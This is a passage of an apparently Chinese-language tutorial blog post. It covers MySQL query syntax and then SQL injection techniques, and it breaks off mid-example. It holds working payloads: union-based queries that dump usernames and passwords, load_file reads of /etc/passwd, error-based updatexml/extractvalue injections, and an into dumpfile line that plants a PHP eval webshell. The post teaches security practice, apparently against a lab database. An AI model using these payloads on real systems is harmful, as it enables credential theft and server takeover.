class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 列名 <span class="keyword">LIKE</span> <span class="string">&#x27;模式&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="分页查询（LIMIT）"><a href="#分页查询（LIMIT）" class="headerlink" title="分页查询（LIMIT）"></a>分页查询（LIMIT）</h5><p>MySQL 的分页通常使用 <strong><code>LIMIT</code> 和 <code>OFFSET</code> 来指定返回数据的数量和起始位置</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line">LIMIT 每页记录数 <span class="keyword">OFFSET</span> 偏移量;</span><br></pre></td></tr></table></figure><p>或更常见的简化语法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line">LIMIT 偏移量, 每页记录数;</span><br></pre></td></tr></table></figure><ul><li><strong>LIMIT</strong>：指定返回的记录数。</li><li><strong>OFFSET</strong>：指定开始返回的记录位置，通常和 <code>LIMIT</code> 搭配使用。</li></ul><h5 id="ORDER-BY-语句"><a href="#ORDER-BY-语句" class="headerlink" title="ORDER BY 语句"></a>ORDER BY 语句</h5><p>在 SQL 查询中，<code>ORDER BY</code> 子句用于对查询结果集按照指定列进行排序，以便得到更直观的输出。排序可以是升序或降序。默认情况下，<code>ORDER BY</code> 会对数据进行升序排序；若想使用降序，则需显式指定。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名<span class="number">1</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], 列名<span class="number">2</span> [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>], ...;</span><br></pre></td></tr></table></figure><ul><li><strong>ASC</strong>：升序排列（默认）；</li><li><strong>DESC</strong>：降序排列；</li></ul><h5 id="分组查询（GROUP-BY）"><a href="#分组查询（GROUP-BY）" class="headerlink" title="分组查询（GROUP BY）"></a>分组查询（GROUP BY）</h5><p>在 MySQL 中，<code>GROUP BY</code> 语句<strong>用于将查询结果中的行按指定列分组，并对每个分组进行聚合操作。</strong> <code>GROUP BY</code> 经常与聚合函数（如 <code>COUNT</code>、<code>SUM</code>、<code>AVG</code> 等）一起使用，用于计数、求和、求平均值，或其他分组计算。<code>HAVING</code> 子句用于筛选分组后的结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 聚合函数(列<span class="number">2</span>)</span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 条件</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 列<span class="number">1</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>列1</strong>：需要分组的字段。</li><li>**聚合函数(列2)**：对每个分组应用的聚合函数，如 <code>COUNT</code>、<code>SUM</code>、<code>AVG</code> 等。</li><li><strong>GROUP BY</strong>：指定按哪一个或多个列分组。</li></ul><h5 id="合并查询结果（UNION）"><a href="#合并查询结果（UNION）" class="headerlink" title="合并查询结果（UNION）"></a>合并查询结果（UNION）</h5><p>在 MySQL 中，<code>UNION</code> 操作符用于合并<strong>两个</strong>或<strong>多个</strong> <code>SELECT</code> 查询的结果，并将它们组合成一个结果集。<code>UNION</code> 可以帮助我们将多张表的结果汇总，并且自动去除重复行。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 列<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">1</span></span><br><span class="line">[<span class="keyword">WHERE</span> 条件]</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> 列<span class="number">1</span>, 列<span class="number">2</span>, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">2</span></span><br><span class="line">[<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure><ul><li><strong>SELECT</strong>：用于定义查询语句，指定要查询的列和表。</li><li><strong>UNION</strong>：用于将多个查询的结果合并在一起。</li><li><strong>WHERE</strong>：可选项，可以对每个查询设置条件。</li></ul><blockquote><p><strong>注意</strong>：每个 <code>SELECT</code> 查询的列数和数据类型必须一致，以便在结果中按列正确合并。</p></blockquote><h5 id="关联查询（join）"><a href="#关联查询（join）" class="headerlink" title="关联查询（join）"></a>关联查询（join）</h5><p>在 MySQL 中，<code>JOIN</code> 操作<strong>用于从多个表中查询相关联的数据。</strong> 通过 <code>JOIN</code> 可以把符合条件的数据从不同的表合并在一起，使得复杂的数据查询和关联分析更加便捷。</p><p>MySQL 中常见的 <code>JOIN</code> 类型有：**<code>INNER JOIN</code>、<code>LEFT JOIN</code>、<code>RIGHT JOIN</code> 和 <code>FULL JOIN</code>（不直接支持）**，不同类型的 <code>JOIN</code> 会根据需要获取交集、左连接、右连接或完整的并集数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 表<span class="number">1.</span>列名, 表<span class="number">2.</span>列名, ...</span><br><span class="line"><span class="keyword">FROM</span> 表<span class="number">1</span></span><br><span class="line"><span class="keyword">JOIN</span> 表<span class="number">2</span></span><br><span class="line"><span class="keyword">ON</span> 表<span class="number">1.</span>关联列 <span class="operator">=</span> 表<span class="number">2.</span>关联列;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>JOIN</strong>：表示连接操作。</li><li><strong>ON</strong>：用于指定两个表之间的关联条件。</li><li><strong>表1.列名</strong> 和 <strong>表2.列名</strong>：用于选择需要的列。</li></ul></blockquote><ul><li><h4 id="INNER-JOIN（内连接）"><a href="#INNER-JOIN（内连接）" class="headerlink" title="INNER JOIN（内连接）"></a><strong>INNER JOIN（内连接）</strong></h4><p><code>INNER JOIN</code> 仅返回两个表中匹配的记录，即满足条件的交集部分。如果没有匹配的记录，不会出现在结果中。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> departments <span class="keyword">ON</span> employees.dept_id <span class="operator">=</span> departments.dept_id;</span><br></pre></td></tr></table></figure></li><li><h4 id="LEFT-JOIN（左连接）"><a href="#LEFT-JOIN（左连接）" class="headerlink" title="LEFT JOIN（左连接）"></a>LEFT JOIN（左连接）</h4><p><code>LEFT JOIN</code> 会返回左表中的所有记录，即使右表中没有对应匹配的记录。对于没有匹配的右表记录，用 <code>NULL</code> 填充。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> departments <span class="keyword">ON</span> employees.dept_id <span class="operator">=</span> departments.dept_id;</span><br></pre></td></tr></table></figure></li><li><h4 id="RIGHT-JOIN（右连接）"><a href="#RIGHT-JOIN（右连接）" class="headerlink" title="RIGHT JOIN（右连接）"></a>RIGHT JOIN（右连接）</h4><p><code>RIGHT JOIN</code> 和 <code>LEFT JOIN</code> 类似，但会<strong>返回右表中的所有记录</strong>，即使左表中没有匹配记录。对于没有匹配的左表记录，用 <code>NULL</code> 填充。</p></li><li><h4 id="CROSS-JOIN（笛卡尔积）"><a href="#CROSS-JOIN（笛卡尔积）" class="headerlink" title="CROSS JOIN（笛卡尔积）"></a>CROSS JOIN（笛卡尔积）</h4><p><code>CROSS JOIN</code> 不需要 <code>ON</code> 条件，它会将左表和右表的所有组合列出，适合在需要笛卡尔积时使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.name, departments.dept_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">CROSS</span> <span class="keyword">JOIN</span> departments;</span><br></pre></td></tr></table></figure><blockquote><p>假设 <code>employees</code> 表有 4 条记录，<code>departments</code> 表有 3 条记录，则结果会包含 4 × 3 &#x3D; 12 条记录。</p></blockquote></li></ul><h5 id="子查询与嵌套查询"><a href="#子查询与嵌套查询" class="headerlink" title="子查询与嵌套查询"></a>子查询与嵌套查询</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 列名<span class="number">1</span>, 列名<span class="number">2</span></span><br><span class="line"><span class="keyword">FROM</span> 表名</span><br><span class="line"><span class="keyword">WHERE</span> 列名 <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> 列名</span><br><span class="line">    <span class="keyword">FROM</span> 另一表</span><br><span class="line">    <span class="keyword">WHERE</span> 条件</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><img src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ%E6%88%AA%E5%9B%BE20240325161309.png"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>SQL注入</strong>指攻击者通过在输入字段中插入恶意的SQL代码，干扰或篡改数据库的正常查询逻辑，从而获取、篡改或删除数据库中的数据。</p><p>SQL注入漏洞产生的两个条件：</p><ul><li>参数用户可控：前端传给后端的参数内容是用户可以控制的。</li><li>参数带入数据库查询：传入的参数拼接到SQL语句并带入数据库查询。</li></ul><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>绕过登录验证：使用万能密码登录网站后台等。</li><li>获取敏感数据：获取网站管理员帐号、密码等。</li><li>文件系统操作：列目录，读取、写入文件等。</li><li>注册表操作：读取、写入、删除注册表等。</li><li>执行系统命令：远程执行命令。</li></ul><h3 id="SQL注入判断及注入点分类"><a href="#SQL注入判断及注入点分类" class="headerlink" title="SQL注入判断及注入点分类"></a>SQL注入判断及注入点分类</h3><p>判断是否存在注入：</p><ul><li>通过改变id的数值，将参数值+1或-1，然后查看页面展示的内容是否会变化，如果页面会发生变化，则我们就可以初步判断，这个id会带入数据库查询，查询后的内容会显示到页面中来。</li><li>通过添加了单引号之后，如果页面中直接进行了报错，并且报错的信息显示到了页面中来，说明我们输入的单引号被带入了数据库查询，我们就可以直接判断此处存在sql注入漏洞。并且结合之前判断的页面是否有回显，就可以尝试进行联合查询注入或是报错注入。</li></ul><p>闭合符判断：</p><p>通过使用<code>\</code>来判断。<code>\</code>后面的跟着的是什么字符，那么它的闭合字符就是什么，若是没有，就为数字型。</p><h2 id="注入常用参数"><a href="#注入常用参数" class="headerlink" title="注入常用参数"></a>注入常用参数</h2><h3 id="ASCII码表"><a href="#ASCII码表" class="headerlink" title="ASCII码表"></a>ASCII码表</h3><table><thead><tr><th>00100000</th><th>32</th><th>20</th><th>(Space)</th><th>空格</th></tr></thead><tbody><tr><td>00100001</td><td>33</td><td>21</td><td>!</td><td></td></tr><tr><td>00100010</td><td>34</td><td>22</td><td>“</td><td></td></tr><tr><td>00100011</td><td>35</td><td>23</td><td>#</td><td></td></tr><tr><td>00100100</td><td>36</td><td>24</td><td>$</td><td></td></tr><tr><td>00100101</td><td>37</td><td>25</td><td>%</td><td></td></tr><tr><td>00100110</td><td>38</td><td>26</td><td>&amp;</td><td></td></tr><tr><td>00100111</td><td>39</td><td>27</td><td>‘</td><td></td></tr><tr><td>00101000</td><td>40</td><td>28</td><td>(</td><td></td></tr><tr><td>00101001</td><td>41</td><td>29</td><td>)</td><td></td></tr><tr><td>00101010</td><td>42</td><td>2A</td><td>*</td><td></td></tr><tr><td>00101011</td><td>43</td><td>2B</td><td>+</td><td></td></tr><tr><td>00101100</td><td>44</td><td>2C</td><td>,</td><td></td></tr><tr><td>00101101</td><td>45</td><td>2D</td><td>-</td><td></td></tr><tr><td>00101110</td><td>46</td><td>2E</td><td>.</td><td></td></tr><tr><td>00101111</td><td>47</td><td>2F</td><td>&#x2F;</td><td></td></tr><tr><td>00110000</td><td>48</td><td>30</td><td>0</td><td></td></tr><tr><td>00110001</td><td>49</td><td>31</td><td>1</td><td></td></tr><tr><td>00110010</td><td>50</td><td>32</td><td>2</td><td></td></tr><tr><td>00110011</td><td>51</td><td>33</td><td>3</td><td></td></tr><tr><td>00110100</td><td>52</td><td>34</td><td>4</td><td></td></tr><tr><td>00110101</td><td>53</td><td>35</td><td>5</td><td></td></tr><tr><td>00110110</td><td>54</td><td>36</td><td>6</td><td></td></tr><tr><td>00110111</td><td>55</td><td>37</td><td>7</td><td></td></tr><tr><td>00111000</td><td>56</td><td>38</td><td>8</td><td></td></tr><tr><td>00111001</td><td>57</td><td>39</td><td>9</td><td></td></tr><tr><td>00111010</td><td>58</td><td>3A</td><td>:</td><td></td></tr><tr><td>00111011</td><td>59</td><td>3B</td><td>;</td><td></td></tr><tr><td>00111100</td><td>60</td><td>3C</td><td>&lt;</td><td></td></tr><tr><td>00111101</td><td>61</td><td>3D</td><td>&#x3D;</td><td></td></tr><tr><td>00111110</td><td>62</td><td>3E</td><td>&gt;</td><td></td></tr><tr><td>00111111</td><td>63</td><td>3F</td><td>?</td><td></td></tr><tr><td>01000000</td><td>64</td><td>40</td><td>@</td><td></td></tr><tr><td>01000001</td><td>65</td><td>41</td><td>A</td><td></td></tr><tr><td>01000010</td><td>66</td><td>42</td><td>B</td><td></td></tr><tr><td>01000011</td><td>67</td><td>43</td><td>C</td><td></td></tr><tr><td>01000100</td><td>68</td><td>44</td><td>D</td><td></td></tr><tr><td>01000101</td><td>69</td><td>45</td><td>E</td><td></td></tr><tr><td>01000110</td><td>70</td><td>46</td><td>F</td><td></td></tr><tr><td>01000111</td><td>71</td><td>47</td><td>G</td><td></td></tr><tr><td>01001000</td><td>72</td><td>48</td><td>H</td><td></td></tr><tr><td>01001001</td><td>73</td><td>49</td><td>I</td><td></td></tr><tr><td>01001010</td><td>74</td><td>4A</td><td>J</td><td></td></tr><tr><td>01001011</td><td>75</td><td>4B</td><td>K</td><td></td></tr><tr><td>01001100</td><td>76</td><td>4C</td><td>L</td><td></td></tr><tr><td>01001101</td><td>77</td><td>4D</td><td>M</td><td></td></tr><tr><td>01001110</td><td>78</td><td>4E</td><td>N</td><td></td></tr><tr><td>01001111</td><td>79</td><td>4F</td><td>O</td><td></td></tr><tr><td>01010000</td><td>80</td><td>50</td><td>P</td><td></td></tr><tr><td>01010001</td><td>81</td><td>51</td><td>Q</td><td></td></tr><tr><td>01010010</td><td>82</td><td>52</td><td>R</td><td></td></tr><tr><td>01010011</td><td>83</td><td>53</td><td>S</td><td></td></tr><tr><td>01010100</td><td>84</td><td>54</td><td>T</td><td></td></tr><tr><td>01010101</td><td>85</td><td>55</td><td>U</td><td></td></tr><tr><td>01010110</td><td>86</td><td>56</td><td>V</td><td></td></tr><tr><td>01010111</td><td>87</td><td>57</td><td>W</td><td></td></tr><tr><td>01011000</td><td>88</td><td>58</td><td>X</td><td></td></tr><tr><td>01011001</td><td>89</td><td>59</td><td>Y</td><td></td></tr><tr><td>01011010</td><td>90</td><td>5A</td><td>Z</td><td></td></tr><tr><td>01011011</td><td>91</td><td>5B</td><td>[</td><td></td></tr><tr><td>01011100</td><td>92</td><td>5C</td><td>\</td><td></td></tr><tr><td>01011101</td><td>93</td><td>5D</td><td>]</td><td></td></tr><tr><td>01011110</td><td>94</td><td>5E</td><td>^</td><td></td></tr><tr><td>01011111</td><td>95</td><td>5F</td><td>_</td><td></td></tr><tr><td>01100000</td><td>96</td><td>60</td><td>&#96;</td><td></td></tr><tr><td>01100001</td><td>97</td><td>61</td><td>a</td><td></td></tr><tr><td>01100010</td><td>98</td><td>62</td><td>b</td><td></td></tr><tr><td>01100011</td><td>99</td><td>63</td><td>c</td><td></td></tr><tr><td>01100100</td><td>100</td><td>64</td><td>d</td><td></td></tr><tr><td>01100101</td><td>101</td><td>65</td><td>e</td><td></td></tr><tr><td>01100110</td><td>102</td><td>66</td><td>f</td><td></td></tr><tr><td>01100111</td><td>103</td><td>67</td><td>g</td><td></td></tr><tr><td>01101000</td><td>104</td><td>68</td><td>h</td><td></td></tr><tr><td>01101001</td><td>105</td><td>69</td><td>i</td><td></td></tr><tr><td>01101010</td><td>106</td><td>6A</td><td>j</td><td></td></tr><tr><td>01101011</td><td>107</td><td>6B</td><td>k</td><td></td></tr><tr><td>01101100</td><td>108</td><td>6C</td><td>l</td><td></td></tr><tr><td>01101101</td><td>109</td><td>6D</td><td>m</td><td></td></tr><tr><td>01101110</td><td>110</td><td>6E</td><td>n</td><td></td></tr><tr><td>01101111</td><td>111</td><td>6F</td><td>o</td><td></td></tr><tr><td>01110000</td><td>112</td><td>70</td><td>p</td><td></td></tr><tr><td>01110001</td><td>113</td><td>71</td><td>q</td><td></td></tr><tr><td>01110010</td><td>114</td><td>72</td><td>r</td><td></td></tr><tr><td>01110011</td><td>115</td><td>73</td><td>s</td><td></td></tr><tr><td>01110100</td><td>116</td><td>74</td><td>t</td><td></td></tr><tr><td>01110101</td><td>117</td><td>75</td><td>u</td><td></td></tr><tr><td>01110110</td><td>118</td><td>76</td><td>v</td><td></td></tr><tr><td>01110111</td><td>119</td><td>77</td><td>w</td><td></td></tr><tr><td>01111000</td><td>120</td><td>78</td><td>x</td><td></td></tr><tr><td>01111001</td><td>121</td><td>79</td><td>y</td><td></td></tr><tr><td>01111010</td><td>122</td><td>7A</td><td>z</td><td></td></tr><tr><td>01111011</td><td>123</td><td>7B</td><td>{</td><td></td></tr><tr><td>01111100</td><td>124</td><td>7C</td><td>|</td><td></td></tr><tr><td>01111101</td><td>125</td><td>7D</td><td>}</td><td></td></tr><tr><td>01111110</td><td>126</td><td>7E</td><td>~</td><td></td></tr><tr><td>01111111</td><td>127</td><td>7F</td><td>DEL (Delete)</td><td>删除</td></tr></tbody></table><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul><li><p><strong>查看数据</strong></p><p><code>version()</code>:查看MySQL版本</p><p><code>user()</code>:数据库用户名</p><p><code>current_user()</code>:当前用户名</p><p><code>database()</code>:数据库名</p><p><code>@@datadir</code>:数据库路径</p><p><code>system_ user()</code>:系统用户名</p><p><code>@@version_compile_os</code>:操作系统版本</p></li><li><p><strong>字符串拼接函数</strong></p><p><code>concat(str1,str2,...)</code>:没有分隔符的连接字符</p><p><code>concat_ws(separator,str1,str2)</code>:含有分隔符的连接字符串</p><p><code>group_concat(str1,str2,...)</code>:连接一个组的所有字符串，并以逗号分割每一条数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’ --+</span><br></pre></td></tr></table></figure><blockquote><p>会返回security库中的所有表并以逗号分隔开</p></blockquote></li><li><p><strong>延时函数</strong></p><p><code>sleep( )</code>:睡眠时间为指定的秒数</p></li><li><p><strong>字符串截取函数</strong></p><p><code>length()</code>:返回字符串的长度</p><blockquote><p>如length(database())会返回数据库名的长度</p></blockquote><p><code>left(str,num)</code>:对字符串str从左开始数起，返回num个字符</p><blockquote><p>如rleft(database(),2)&#x3D;se</p></blockquote><p><code>right(str,num)</code>:对字符串str从右开始数起，返回num个字符（与left相反）</p><p><code>substr(str,num1,num2)</code>:截取字符串，从起始位置num1开始，截取长度为num2</p><blockquote><p>**substr(database(),1,3)**从数据库第一位开始截取，截取三个字符</p></blockquote><p><code>substring( )</code>:与<code>substr()</code>一样</p><p><code>mid(str,sum1,sum2)</code>:与<code>substr()</code>一样</p></li><li><p><strong>编码函数</strong></p><p><code>ord()</code>:返回字符串第一个字符的ASCII值</p><blockquote><p>如<code>ord(&#39;a&#39;)</code>会返回97</p></blockquote><p><code>ascii()</code>:返回字符串第一个字符的ASCII值,与<code>ord()</code>一样</p><p><code>hex()</code>:将字符串转换为十六进制</p><p><code>unhex()</code>:hex的反向操作</p><p><code>md5()</code>:返回MD5值</p></li><li><p><strong>转义函数及配置</strong></p><p><code>addslashes()</code>:返回在预定义字符之前添加反斜杠的字符串。</p><blockquote><p>预定义字符：单引号<code>&#39;</code>,双引号<code>&quot;</code>,反斜杠<code>\</code>,NULL</p></blockquote><p><code>magic_quotes_gpc</code>:解析用户提交的数据，如有：post、get、cookie过来的数据增加转义符“\” 以确保这些数据不会引起程序错误,可用于防护SQL</p><blockquote><p><strong>PHP 5.4.0 版本之后被废弃，并在 PHP 7.0.0 中彻底移除。</strong></p></blockquote><p><code>mysql_real_escape_string():</code>用于在 MySQL 查询中转义特殊字符,返回转义后的字符串</p></li><li><p><strong>读写文件函数</strong></p><p><code>load_file()</code>:用于读取文件，返回文件内容作为字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#读取文件/etc/passwd （还可以查看其他文件，需要相应的权限）</span><br><span class="line">#路径可以为这两种格式&quot;\\&quot;与&quot;/&quot;，</span><br><span class="line">union select 1,2,load_file(&#x27;/etc/passwd&#x27;)</span><br></pre></td></tr></table></figure><p><code>into dumpfile</code>:用于写文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在/var/www/html新建文件a.php，在将一句话木马写入</span><br><span class="line">union select 1,2,&quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into dumpfile &#x27;/var/www/html/a.php&#x27; </span><br></pre></td></tr></table></figure><p><code>into outfile</code>:与<code>into dumpfile</code>用法一样</p></li><li><p><strong>其他函数</strong></p><p><code>if(true,t,f)</code>:用于判断</p><p><code>floor()</code>:向下取整</p><blockquote><p>floor(3.8)&#x3D;3</p></blockquote><p><code>count()</code>：返回当前列的数量</p><p><code>rand()</code>:取随机数0~1，若有参数x，则每个x对应一个固定的值</p><p><code>exp()</code>:以e为底的指数函数</p><blockquote><p>~0表示对0进行按位取反</p></blockquote><p><code>updatexml(XML_document, XPath_string, new_value)</code>:</p><ul><li>XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>XPath_string (Xpath格式的字符串)</li><li>new_value，String格式，替换查找到的符合条件的数据</li></ul><p><code>extractvalue(XML_document, XPath_string)</code>:与<code>updatexml()</code>类似，只是变成了两个参数</p></li></ul><h3 id="常用库表"><a href="#常用库表" class="headerlink" title="常用库表"></a>常用库表</h3><p><img src="file://D:\Typora\images\QQ%E6%88%AA%E5%9B%BE20231220193939.png?lastModify=1744894085" alt="img"></p><p>information_schema.schemata：记录数据库信息的表 information_schema.tables：记录表名信息的表 information_schema.columns：记录列名信息的表 schema_name 数据库名 table_name 表名 column_name 列名 table_schema 数据库名</p><p>例：</p><blockquote><p>查数据库名：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata;</span><br></pre></td></tr></table></figure><blockquote><p>查表名：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>查数据：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from security.users;</span><br></pre></td></tr></table></figure><blockquote><p>查列名：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name= &#x27;users&#x27; and table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure><h2 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h2><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p>原理：通过使用union关键字，对两个select语句进行联合查询；使用前提是<strong>前后查询的语句必须拥有相同数量的列</strong>（字段），列也必需拥有相同的数据类型。</p><p>适用情况：<strong>页面存在回显</strong>。</p><p>注入流程：</p><ul><li><p><strong>判断注入点</strong></p></li><li><p><strong>判断字段数</strong></p><p>因为union前面查询语句查询的元素与后面查询语句查询的元素要数量上一样。所以要通过order by判断字段数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>判断回显点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><blockquote><p>将id值改为111是为了让前面查询的语句为空，无显示，然后后面查询语句查询的元素显示出来。</p></blockquote></li><li><p><strong>查找库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>查找表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure><blockquote><p>group_concat()函数将所有查询的表名连在一起成为一条数据。</p></blockquote></li><li><p><strong>查找列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 111&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;  --+</span><br></pre></td></tr></table></figure></li><li><p><strong>查找字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,group_concat(username),group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure></li></ul><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>页面没有内容回显，那么我们可以通过构造特定的SQL 语句使得数据库软件执行错误，随后服务端将错误反馈到用户端以暴露出<strong>特定信息</strong>的攻击方式。</p><p>一种情况是通过构造错误的参数，使得一些 SQL 语句的错误直接回显在页面上，暴露一些 SQL 语句信息便于使用特定的攻击手段；</p><p>另一种情况是后台没有对一些具有报错功能的函数进行过滤，使得一些关键信息被直接被以报错的形式携带到页面上。</p><p>二者的前提都<strong>基于 WEB 应用程序未关闭数据库的报错函数</strong>。</p><h4 id="updatexml-extractvalue"><a href="#updatexml-extractvalue" class="headerlink" title="updatexml()&#x2F;extractvalue()"></a>updatexml()&#x2F;extractvalue()</h4><p><code>updatexml(XML_document, XPath_string, new_value)</code>:</p><ul><li>XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>XPath_string (Xpath格式的字符串)</li><li>new_value，String格式，替换查找到的符合条件的数据</li></ul><p><code>extractvalue(XML_document, XPath_string)</code>:与<code>updatexml()</code>类似，只是变成了两个参数</p><p>原理就是<strong>利用XML解析错误，通过构造错误的XPath表达式来触发报错。Xpath语法不允许存在特殊字符串，而我们可以构造0x7e(~)特殊字符来报错</strong></p><p><strong>查库名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,database(),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,database(),0x7E));</span><br></pre></td></tr></table></figure><p><strong>查表名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 